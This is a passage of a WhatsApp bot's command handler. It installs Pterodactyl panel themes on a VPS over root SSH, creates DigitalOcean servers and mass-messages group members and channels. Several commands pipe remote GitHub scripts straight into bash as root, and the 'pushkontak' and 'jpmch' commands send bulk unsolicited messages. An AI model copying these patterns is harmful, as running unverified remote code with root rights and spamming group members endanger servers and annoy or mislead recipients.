    if (global.installtema == undefined) return xreply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
      host: ipvps,
      port: '22',
      username: 'root',
      password: passwd
    }

    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
    const ress = new Client();

    ress.on('ready', () => {
      xreply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
      ress.exec(command, (err, stream) => {
        if (err) throw err
        stream.on('close', async (code, signal) => {
          await xreply("Berhasil install *tema enigma* pterodactyl ✅")
          ress.end()
        }).on('data', async (data) => {
          console.log(data.toString())
          stream.write(`skyzodev\n`);
          stream.write('1\n');
          stream.write('3\n');
          stream.write('https://wa.me/6285624297893\n');
          stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
          stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
          stream.write('yes\n');
          stream.write('x\n');
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data)
        });
      });
    }).on('error', (err) => {
      console.log('Connection Error: ' + err);
      xreply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
  }
  break

  case "installtemabilling":
  case "instaltemabiling": {
    if (!isOwner) return xreply(mess.owner)
    if (global.installtema == undefined) return xreply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
      host: ipvps,
      port: '22',
      username: 'root',
      password: passwd
    }

    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
    const ress = new Client();

    ress.on('ready', () => {
      xreply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
      ress.exec(command, (err, stream) => {
        if (err) throw err
        stream.on('close', async (code, signal) => {
          await xreply("Berhasil install *tema billing* pterodactyl ✅")
          ress.end()
        }).on('data', async (data) => {
          console.log(data.toString())
          stream.write(`skyzodev\n`)
          stream.write(`1\n`)
          stream.write(`2\n`)
          stream.write(`yes\n`)
          stream.write(`x\n`)
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data)
        });
      });
    }).on('error', (err) => {
      console.log('Connection Error: ' + err);
      xreply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
  }
  break

  case "installtemastellar":
  case "installtemastelar": {
    if (!isOwner) return xreply(mess.owner)
    if (global.installtema == undefined) return xreply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
      host: ipvps,
      port: '22',
      username: 'root',
      password: passwd
    }

    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
    const ress = new Client();

    ress.on('ready', async () => {
      xreply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
      ress.exec(command, (err, stream) => {
        if (err) throw err
        stream.on('close', async (code, signal) => {
          await xreply("Berhasil install *tema stellar* pterodactyl ✅")
          ress.end()
        }).on('data', async (data) => {
          console.log(data.toString())
          stream.write(`skyzodev\n`)
          stream.write(`1\n`)
          stream.write(`1\n`)
          stream.write(`yes\n`)
          stream.write(`x\n`)
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data)
        });
      });
    }).on('error', (err) => {
      console.log('Connection Error: ' + err);
      xreply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
  }
  break

  case "installtemanightcore": {
    if (!isOwner) return xreply(mess.owner)
    if (global.installtema == undefined) return xreply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
      host: ipvps,
      port: '22',
      username: 'root',
      password: passwd
    }

    const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
    const ress = new Client();

    ress.on('ready', async () => {
      xreply("Memproses install *tema night core* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
      ress.exec(command, (err, stream) => {
        if (err) throw err
        stream.on('close', async (code, signal) => {
          await xreply("Berhasil install *tema nightcore* pterodactyl ✅")
          ress.end()
        }).on('data', async (data) => {
          console.log(data.toString())
          stream.write('1\n');
          stream.write('y\n');
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data)
        });
      });
    }).on('error', (err) => {
      console.log('Connection Error: ' + err);
      xreply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
  }
  break

  case "installdepend": {
    if (!isOwner) return xreply(mess.owner)
    if (global.installtema == undefined) return xreply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
      host: ipvps,
      port: '22',
      username: 'root',
      password: passwd
    }

    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
      xreply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai");
      ress.exec(command, (err, stream) => {
        if (err) throw err;
        stream.on('close', async (code, signal) => {
          await xreply("Berhasil install Depend silakan ketik .installnebula ✅");
          ress.end();
        }).on('data', async (data) => {
          console.log(data.toString());
          stream.write('11\n');
          stream.write('A\n');
          stream.write('Y\n');
          stream.write('Y\n');
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
      });
    }).on('error', (err) => {
      console.log('Connection Error: ' + err);
      xreply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
  }
  break

  case "installtemanebula": {
    if (!isOwner) return xreply(mess.owner)
    if (global.installtema == undefined) return xreply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
      host: ipvps,
      port: '22',
      username: 'root',
      password: passwd
    }

    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
    const ress = new Client();

    ress.on('ready', async () => {
      xreply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
      ress.exec(command, (err, stream) => {
        if (err) throw err
        stream.on('close', async (code, signal) => {
          await xreply("Berhasil install *tema nebula* pterodactyl ✅")
          ress.end()
        }).on('data', async (data) => {
          console.log(data.toString())
          stream.write('2\n');
          stream.write('\n');
          stream.write('\n');
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data)
        });
      });
    }).on('error', (err) => {
      console.log('Connection Error: ' + err);
      xreply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
  }
  break

  /// ───────────── [ 𝖵𝖯𝖲 𝖬𝖺𝗇𝖺𝗀𝖾𝗆𝖾𝗇𝗍 ] ──────────── ///
  case "cvps": {
    if (!text) return xreply(example("hostname"))
    return client.sendMessage(m.chat, {
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'ini pesan interactiveMeta' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Pilih Spesifikasi Vps',
              sections: [
                {
                  title: 'List Ram & Cpu Vps',
                  highlight_label: 'Recommended',
                  rows: [
                    {
                      title: 'Ram 16GB || CPU 4',
                      id: `.r16c4 ${text}`
                    },
                    {
                      title: 'Ram 1GB || CPU 1',
                      id: `.r1c1 ${text}`
                    },
                    {
                      title: 'Ram 2GB || CPU 1',
                      id: `.r2c1 ${text}`
                    },
                    {
                      title: 'Ram 2GB || CPU 2',
                      id: `.r2c2 ${text}`
                    },
                    {
                      title: 'Ram 4GB || CPU 2',
                      id: `.r4c2 ${text}`
                    },
                    {
                      title: 'Ram 8GB || CPU 4',
                      id: `.r8c4 ${text}`
                    }
                  ]
                }
              ]
            })
          }
        }
      ],
      footer: `© 2026 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: "Pilih Spesifikasi Vps Yang Tersedia\n",
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      },
    }, { quoted: m })
  }
  break

  case "r1c1":
  case "r2c1":
  case "r2c2":
  case "r4c2":
  case "r8c4":
  case "r16c4": {
    if (!isOwner) return xreply(mess.owner)
    if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
      images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
      images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
      images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
      images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
      images = 's-4vcpu-8gb'
    } else {
      images = "s-4vcpu-16gb-amd"
      region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return xreply(example("hostname"))

    try {
      let dropletData = {
        name: hostname,
        region: region,
        size: images,
        image: 'ubuntu-20-04-x64',
        ssh_keys: null,
        backups: false,
        ipv6: true,
        user_data: null,
        private_networking: null,
        volumes: null,
        tags: ['T']
      };

      let password = await generateRandomPassword()
      dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

      let response = await fetch('https://api.digitalocean.com/v2/droplets', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apiDigitalOcean
        },
        body: JSON.stringify(dropletData)
      });

      let responseData = await response.json();

      if (response.ok) {
        let dropletConfig = responseData.droplet;
        let dropletId = dropletConfig.id;

        await xreply(`Memproses pembuatan vps...`);
        await new Promise(resolve => setTimeout(resolve, 60000));

        let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': "Bearer " + global.apiDigitalOcean
          }
        });

        let dropletData = await dropletResponse.json();
        let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0
          ? dropletData.droplet.networks.v4[0].ip_address
          : "Tidak ada alamat IP yang tersedia";

        let messageText = `VPS berhasil dibuat!\n\n`;
        messageText += `ID: ${dropletId}\n`;
        messageText += `IP VPS: ${ipVPS}\n`;
        messageText += `Password: ${password}`;

        await client.sendMessage(m.chat, { text: messageText });
      } else {
        throw new Error(`Gagal membuat VPS: ${responseData.message}`);
      }
    } catch (err) {
      console.error(err);
      xreply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
  }
  break

  /// ───────────── [ 𝖯𝗎𝗌𝗁 𝖪𝗈𝗇𝗍𝖺𝗄 ] ──────────── ///
  case "pushkontak2": {
    if (!isOwner) return xreply(mess.owner)
    if (!m.isGroup) return xreply(mess.group)
    if (!text) return xreply(example("pesannya"))
    const teks = text
    const jidawal = m.chat
    const data = await client.groupMetadata(m.chat)
    const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    await xreply(`Memproses pushkontak ke *${halls.length}* member grup`)
    for (let mem of halls) {
      if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
        await client.sendMessage(mem, { text: teks }, { quoted: qlocPush })
        await sleep(global.delayPushkontak)
      }
    }

    await client.sendMessage(jidawal, { text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}` }, { quoted: m })
  }
  break

  case "respushkontak": {
    if (!isOwner) return
    if (!text) return
    if (!global.textpushkontak) return
    const idgc = text
    const teks = global.textpushkontak
    const jidawal = m.chat
    const data = await client.groupMetadata(idgc)
    const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    await xreply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

    for (let mem of halls) {
      if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
        await client.sendMessage(mem, { text: teks }, { quoted: qlocPush })
        await sleep(global.delayPushkontak)
      }
    }

    delete global.textpushkontak
    await client.sendMessage(jidawal, { text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}` }, { quoted: m })
  }
  break

  case "pushkontak": {
    if (!isOwner) return xreply(mess.owner)
    if (!text) return xreply(example("pesannya"))
    const meta = await client.groupFetchAllParticipating()
    let dom = await Object.keys(meta)
    global.textpushkontak = text
    let list = []
    for (let i of dom) {
      await list.push({
        title: meta[i].subject,
        id: `.respushkontak ${i}`,
        description: `${meta[i].participants.length} Member`
      })
    }
    return client.sendMessage(m.chat, {
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'ini pesan interactiveMeta' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Pilih Grup',
              sections: [
                {
                  title: 'List Grup Chat',
                  rows: [...list]
                }
              ]
            })
          }
        }
      ],
      footer: `© ${global.botname} • 2026`,
      headerType: 1,
      viewOnce: true,
      text: "Pilih Target Grup Pushkontak\n",
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
      },
    }, { quoted: m })
  }
  break

  case "joingb":
  case "join": {
    if (!isOwner) return xreply(mess.owner)
    if (!text) return xreply(example("linkgcnya"))
    if (!text.includes("chat.whatsapp.com")) return xreply("Link tautan tidak valid")
    let result = text.split('https://chat.whatsapp.com/')[1]
    let id = await client.groupAcceptInvite(result)
    xreply(`Berhasil bergabung ke dalam grup ${id}`)
  }
  break

  /// ───────────── [ 𝖢𝗁𝖺𝗇𝗇𝖾𝗅 𝖴𝗉𝗅𝗈𝖺𝖽 ] ──────────── ///
  case 'upch':
  case 'upchannel':
  case 'sendch': {
    if (!isOwner) return xreply(mess.owner);
    const clientsender = m.key.remoteJid;
    const name = client.getName ? await client.getName(clientsender) : 'kamu';
    const targetChannel = targetChannelData.id;
    if (!text && !(quoted && quoted.message)) {
      return xreply(`Cara penggunaan *${prefix}upch*:\n\n` +
        `1. Balas media (foto/video/sticker/audio/dokumen) + ketik *${prefix}upch* untuk kirim media ke channel.\n\n` +
        `*Note:*\n` +
        `Sebelum pakai, pastikan sudah set target channel pakai perintah *${prefix}setch 120xxxx@newsletter*\n\n` +
        `> MISTER-MD`);
    }
    client.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
    const contentText = text?.trim();
    const ppuser = await getBuffer(await client.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/8534/638498350_rafaofficial.jpg'));
    const ctx = {
      mentionedJid: [m.sender],
      forwardingScore: 9999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: targetChannel,
        serverMessageId: 20,
        newsletterName: `${global.namaSaluran}`
      },
      externalAdReply: {
        title: `⭐ Pesan dari ${name}`,
        body: `Runtime: ${runtime(process.uptime())} ⚙️`,
        thumbnail: ppuser,
        mediaType: 1,
        sourceUrl: `${global.source}`
      }
    };
    const isQuoted = quoted && quoted.message;
    if (isQuoted) {
      const type = Object.keys(quoted.message)[0];
      const media = await client.downloadAndSaveMediaMessage(quoted);
      const fileName = quoted?.fileName || 'File.unknown';
      switch (type) {
        case 'imageMessage':
          await client.sendMessage(targetChannel, { image: { url: media }, caption: contentText || '', contextInfo: ctx });
          break;
        case 'videoMessage':
          await client.sendMessage(targetChannel, { video: { url: media }, caption: contentText || '', contextInfo: ctx });
          break;
        case 'audioMessage':
          await client.sendMessage(targetChannel, { audio: { url: media }, mimetype: 'audio/mp4', ptt: quoted.message.audioMessage?.ptt || false, contextInfo: ctx });
          break;
        case 'stickerMessage':
          await client.sendMessage(targetChannel, { sticker: { url: media }, contextInfo: ctx });
          break;
        case 'documentMessage':
          await client.sendMessage(targetChannel, { document: { url: media }, mimetype: quoted.mimetype || 'application/octet-stream', fileName: fileName, contextInfo: ctx });
          break;
        default:
          await client.sendMessage(targetChannel, { document: { url: media }, mimetype: 'application/octet-stream', fileName: fileName, contextInfo: ctx });
          break;
      }
    } else if (contentText) {
      await client.sendMessage(targetChannel, { text: contentText, contextInfo: ctx });
    }
    client.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
  }
  break

  case "jpmch": {
    if (!isOwner) return xreply(mess.owner)
    if (!text && !m.quoted) return xreply(example("Teksnya atau reply teks"));
    var teks = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels ??= loadChannels();

    if (global.channels.length === 0)
      return xreply(`
╔══════════════════════════╗ 
 ❌ *SALAHAN* ❌ 
╚══════════════════════════╝ 
⚠️ Tidak ada saluran terdaftar untuk *JPM*! 
Silakan daftarkan saluran terlebih dahulu. 
`);

    xreply(`
╭─❰ *PROCESSING MESSAGE* ❱─╮ 
📮 *Mengirim Pesan Ke*: 
 ➥ *${global.channels.length} Saluran* 
⏳ *Mohon Tunggu...* 
╰─────────────────────╯ 
 `);

    for (let id of global.channels) {
      try {
        await client.sendMessage(id, { text: teks }, { quoted: qloc });
        total += 1;
      } catch (e) {
        console.log(`⚠️ Gagal mengirim ke ${id}:`, e);
      }
      await sleep(global.delayJpm);
    }

    xreply(`
╭─❰ *𝖲𝖴𝖢𝖢𝖤𝖲𝖤𝖣 𝖲𝖤𝖭𝖣* ❱
└▢ *Pesan Terkirim*: 
└▢ *${total} Saluran* 
└▢ *Status*: Berhasil! 
└▢ *Jeda : ${global.cooldown}*
 `);
  }
  break

  case "jpmch2": {
    if (!isOwner) return xreply(mess.owner)

    const qmsg = m.quoted ? m.quoted : m
    let teks = (text || "").trim()
    let mediaBuffer = null
    let mediaType = null

    if (!teks && m.quoted) {
      teks = qmsg.text || qmsg.body || qmsg.contentText || ""
    }

    if (!teks && !m.quoted) {
      return xreply(example("Teksnya atau reply teks/media"))
    }

    if (m.quoted) {
      try {
        const quotedMime = qmsg.mimetype || ""
        if (qmsg.isImage || /^image\//i.test(quotedMime)) {
          mediaBuffer = await qmsg.download()
          mediaType = "image"
        } else if (qmsg.isVideo || /^video\//i.test(quotedMime)) {
          mediaBuffer = await qmsg.download()
          mediaType = "video"
        } else if (qmsg.isAudio || /^audio\//i.test(quotedMime)) {
          mediaBuffer = await qmsg.download()
          mediaType = "audio"
        }
      } catch (err) {
        console.log("[JPMCH2] Media download failed:", err?.message)
      }
    }

    const fetchSubscribedChannels = async (sock) => {
      const data = {}
      const encoder = new TextEncoder()
      const queryIds = ["6388546374527196"]

      for (const queryId of queryIds) {
        try {
          if (typeof sock.query !== "function") {
            throw new Error("sock.query tidak tersedia")
          }

          const result = await sock.query({
            tag: "iq",
            attrs: {
              id: sock.generateMessageTag(),
              type: "get",
              xmlns: "w:mex",
              to: "@s.whatsapp.net",
            },
            content: [
              {
                tag: "query",
                attrs: { query_id: queryId },
                content: encoder.encode(JSON.stringify({ variables: {} })),
              },
            ],
          })

          const resultNode = getBinaryNodeChildren(result, "result")[0]
          if (!resultNode?.content) continue

          const parsed = JSON.parse(resultNode.content.toString())
          const newsletters =
            parsed?.data?.["xwa2_newsletter_subscribed"] ||
            parsed?.data?.["newsletter_subscribed"] ||
            parsed?.data?.["subscribed"] ||
            []

          if (newsletters.length > 0) {
            for (const ch of newsletters) {
              if (!ch.id) continue
              data[ch.id] = {
                id: ch.id,
                name: ch.thread_metadata?.name?.text || ch.name || "Unknown",
                subscribers: ch.thread_metadata?.subscribers_count || 0,
              }
            }
            break
          }
        } catch (err) {
          console.log(`[JPMCH2] Query ${queryId} failed:`, err?.message)
        }
      }
      return data
    }

    await client.sendMessage(m.chat, { react: { text: "📢", key: m.key } })

    try {
      let channels = await fetchSubscribedChannels(client)
      let channelIds = Object.keys(channels)

      if (channelIds.length === 0) {
        global.channels ??= loadChannels()
        if (Array.isArray(global.channels) && global.channels.length > 0) {
          for (const id of global.channels) {
            channels[id] = { id, name: "Saved Channel", subscribers: 0 }
          }
          channelIds = Object.keys(channels)
        }
      }

      if (channelIds.length === 0) {
        await client.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
        return xreply(
          `❌ *Tidak ada channel*\n\n` +
          `> Bot belum subscribe channel apapun.\n` +
          `> Tambahkan manual lewat *.addidch <link>* dulu.`
        )
      }

      const jedaJpm = Number(global.delayJpm) || 5000
      const ctx = {
        isForwarded: true,
        forwardingScore: 999,
        forwardedNewsletterMessageInfo: {
          newsletterJid: global.idSaluran,
          newsletterName: global.namaSaluran,
          serverMessageId: 127,
        },
      }

      const preview = teks
        ? teks.substring(0, 60) + (teks.length > 60 ? "..." : "")
        : "Tidak ada"

      await xreply(`
  ❰ *𝖯𝖱𝖮𝖲𝖤𝖲 𝖲𝖤𝖭𝖣* ❱
> 📝 Pesan   : *${preview}*
> 📷 Media   : *${mediaBuffer ? mediaType : "Tidak ada"}*
> 📺 Target  : *${channelIds.length}* channel
_Sedang mengirim ke semua channel_`
      )

      let xsaluran = 0
      let xfailed = 0
      const failedChannels = []

      for (const chId of channelIds) {
        if (global.stopjpm) {
          delete global.stopjpm
          await client.sendMessage(m.chat, { react: { text: "⏹️", key: m.key } })
          return xreply(`
  ❰ *𝖣𝖨𝖧𝖤𝖭𝖳𝖨𝖪𝖠𝖭 𝖲𝖤𝖭𝖣* ❱
> ▢ Berhasil: *${xsaluran}*
> ▢ Gagal: *${xfailed}*
> ▢ Sisa: *${channelIds.length - xsaluran - xfailed}*`
          )
        }

        try {
          const payload = mediaBuffer
            ? { [mediaType]: mediaBuffer, caption: teks, contextInfo: ctx }
            : { text: teks, contextInfo: ctx }

          await client.sendMessage(chId, payload)
          xsaluran++
        } catch (err) {
          xfailed++
          failedChannels.push(channels[chId]?.name || chId)
          console.log(`[JPMCH2] Failed ${chId}:`, err?.message)
        }

        await sleep(jedaJpm)
      }

      await client.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

      let xmsg =
        `╭─❰ *𝖲𝖴𝖢𝖢𝖤𝖲𝖤𝖣 𝖲𝖤𝖭𝖣* ❱
└▢ *Pesan: Terkirim*: 
└▢ *${xsaluran} Saluran* 
└▢ *Status: Berhasil! 
└▢ *Creator: FyzzModss*`

      if (failedChannels.length > 0) {
        xmsg +=
          ` └▢ *Channel Gagal:*\n` +
          failedChannels.map((n, i) => `> ${i + 1}. ${n}`).join("\n")
      }

      await xreply(xmsg)

    } catch (error) {
      console.error("[JPMCH2 ERROR]", error)
      await client.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
      return xreply(
        `❌ *JPMCH2 Error*\n\n` +
        `${error?.message || error}`
      )
    }
  }
  break

  case "delidch": {
    if (!isOwner) return reply(mess.owner);
    if (!text) return reply("Harap masukkan nomor atau ID saluran yang ingin dihapus!");

    global.channels ??= loadChannels();

    if (!isNaN(text)) {
      let index = parseInt(text.trim()) - 1;

      if (start < 0 || start >= global.channels.length) {
        return xreply("Nomor urut tidak valid!");
      }

      let removed = global.channels.splice(index, 1);
      saveChannels(global.channels);

      xreply(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
    } else {
      let channelId = text.trim();

      if (!global.channels.includes(channelId)) {
        return reply("ID Saluran tidak ditemukan!");
      }

      global.channels = global.channels.filter((id) => id !== channelId);
      saveChannels(global.channels);

      Reply(`Berhasil menghapus ID Saluran: *${channelId}*`);
    }
  }
  break

  case "addidch": {
    if (!isOwner) return xreply(!isOwner);
    if (!text) return reply("Harap masukkan link saluran!");

    let channelLink = text.trim();

    if (!channelLink.includes("https://whatsapp.com/channel/")) {
      return xreply("Link saluran tidak valid! Harus berupa link WhatsApp (https://whatsapp.com/channel/...)");
    }

    let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
    if (!channelId) return xreply("Gagal mengekstrak ID dari link saluran!");

    try {
      let res = await client.newsletterMetadata("invite", channelId);

      if (!res.id) return reply("ID saluran tidak valid!");

      global.channels ??= loadChannels();

      if (global.channels.includes(res.id)) {
        return xreply(`ID Saluran *${res.id}* sudah terdaftar!`);
      }

      global.channels.push(res.id);
      saveChannels(global.channels);

      Reply(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
    } catch (e) {
      console.error(e);
      Reply("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
    }
  }
  break

  case "cekidch":
  case "idch": {
    if (!text) return reply(example("linkchnya 🤨"))
    if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")

    let kode = text.split("https://whatsapp.com/channel/")[1].split(/[/?\s]/)[0]
    let res = await client.newsletterMetadata("invite", kode).catch(() => null)
    if (!res) return reply("Channel tidak ditemukan")

    let th = res.thread_metadata || {}
    let nama = res.name?.text || res.name || th.name?.text || "-"
    let pengikut = res.subscribers || th.subscribers_count || "-"
    let status = res.state?.type || res.state || th.state?.type || "-"
    let verif = (res.verification || th.verification) == "VERIFIED" ? "Terverifikasi" : "Tidak"

    let teks = `
* *ID :* ${res.id}
* *Nama :* ${nama}
* *Total Pengikut :* ${pengikut}
* *Status :* ${status}
* *Verified :* ${verif}`

    let msgii = await generateWAMessageFromContent(m.chat, {
      viewOnceMessageV2Extension: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: { text: teks },
            nativeFlowMessage: {
              buttons: [{
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "Copy ID Channel",
                  id: "copy_id",
                  copy_code: res.id
                })
              }]
            }
          })
        }
      }
    }, { userJid: client.user.id, quoted: m })

    await client.relayMessage(m.chat, msgii.message, {
      messageId: msgii.key.id,
      additionalNodes: [{
        tag: "biz",
        attrs: {},
        content: [{
          tag: "interactive",
          attrs: { type: "native_flow", v: "1" },
          content: [{ tag: "native_flow", attrs: { v: "9", name: "mixed" }, content: [] }]
        }]
      }]
    })
  }
  break

  case "rch": {
    const rchLink = args[0]
    let rchEmojiRaw = args.slice(1).join(' ').trim()

    if (!rchLink || !rchEmojiRaw) {
      return xreply(
        `Formatnya kurang nih~ 📋\n\n` +
        `*${prefix + command} <link_pesan_channel> <emoji1,emoji2>*\n\n` +
        `Contoh:\n` +
        `*${prefix + command} https://whatsapp.com/channel/xxx/5 😭,🔥*`
      )
    }

    if (!rchLink.includes('whatsapp.com/channel/')) {
      return xreply('Link channel-nya ga valid nih~ (｡•́︿•̀｡) harus link WhatsApp Channel ya 🌸')
    }

    const rchLinkClean = rchLink.split('?')[0].replace(/\/+$/, '')
    const rchSlashCount = (rchLinkClean.match(/\//g) || []).length

    if (rchSlashCount < 5) {
      return xreply(
        'MISTER-MD~ itu link *profil* channel, bukan link *pesan* channel nih~ (｡•́︿•̀｡)\n\n' +
        'Buka pesan di channel-nya, lalu ambil link pesannya (ada angka di belakang, misal .../141) ya 🌸'
      )
    }

    if (rchSlashCount !== 5) {
      return xreply('Link pesan channel-nya ga valid nih~ (｡•́︿•̀｡) coba cek lagi ya 🌸')
    }

    if (!rchEmojiRaw.includes(',')) {
      rchEmojiRaw = Array.from(rchEmojiRaw).filter(ch => ch.trim().length > 0).join(',')
    }

    const rchEmojis = rchEmojiRaw.split(',').map(e => e.trim()).filter(Boolean)

    if (!rchEmojis.length) return xreply('Emoji-nya mana kak~ 😅🌸')
    if (rchEmojis.length > 4) return xreply('Maksimal 4 emoji aja ya kak~ 🌸')

    await client.sendMessage(m.chat, { react: { text: '🕒', key: m.key } })

    try {
      const rchApiUrl =
        `https://api.nexadev.my.id/api/rch?key=GateKey22` +
        `&url=${encodeURIComponent(rchLink)}` +
        `&reaction=${encodeURIComponent(rchEmojis.join(','))}`

      const { data: rchResult } = await axios.get(rchApiUrl, { timeout: 30000 })

      if (rchResult && rchResult.status === false) {
        throw new Error(rchResult.message || 'RCH API mengembalikan status gagal')
      }

      await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } })

      await xreply(
        `🔔 *𝖲𝗎𝖼𝖼𝖾𝖾𝖽 𝖱𝖾𝖺𝖼𝗍 𝖢𝗁𝖺𝗇𝗇𝖾𝗅*
└╼ *𝗅𝗂𝗇𝗄* : ${rchLink}
└╼ *𝗋𝖾𝖺𝖼𝗍* : \`${rchEmojis.join(', ')}\`
└╼ *𝗌𝗍𝖺𝗍𝗎𝗌* : *Sukses*`
      )

    } catch (rchErr) {
      console.error('[rch-error]', rchErr.response?.data || rchErr.message)

      await client.sendMessage(m.chat, { react: { text: '❌', key: m.key } })

      await xreply(`
‼️ *𝖦𝖺𝗀𝖺𝗅 𝖱𝖾𝖺𝖼𝗍 𝖢𝗁𝖺𝗇𝗇𝖾𝗅*
└╼ *𝗅𝗂𝗇𝗄* : ${rchLink}
└╼ *𝗋𝖾𝖺𝖼𝗍* : \`${rchEmojis.join(', ')}\`
└╼ *𝗌𝗍𝖺𝗍𝗎𝗌* : *Gagal, coba lagi ya~*`
      )
    }
  }
  break

  /// ───────────── [ 𝖦𝖾𝗍 𝖢𝖺𝗌𝖾 ] ──────────── ///
  case 'getcase': {
    try {
      if (!isOwner) return reply(mess.owner)
      if (!text) return xreply('❌ Masukkan nama case!\n\nContoh: .getcase menu');
      const caseFilePath = './case.js';

      let caseFileContent = fs.readFileSync(caseFilePath, 'utf8');
      let caseLines = caseFileContent.split('\n');

      let caseRegex = new RegExp(`^\\s*case\\s+['"]${text}['"]\\s*:`);
      let startLine = null;
      let endLine = null;
      let foundCase = null;

      for (let i = 0; i < caseLines.length; i++) {
        if (caseRegex.test(caseLines[i])) {
          startLine = i;
          foundCase = [];

          for (let j = i; j < caseLines.length; j++) {
            foundCase.push(caseLines[j]);
            if (/^\s*break\s*/.test(caseLines[j])) {
              endLine = j;
              break;
            }
          }
          break;
        }
      }
      if (!foundCase) return xreply(`❌ Case *${text}* tidak ditemukan!`);

      let caseContent = foundCase.join('\n');

      let teksnya = `💌 \`Case ditemukan!\`\n\n*Nama Case :* ${text}\n*Baris :* ${startLine + 1} - ${endLine + 1}\n\n> © MISTER-MD`;

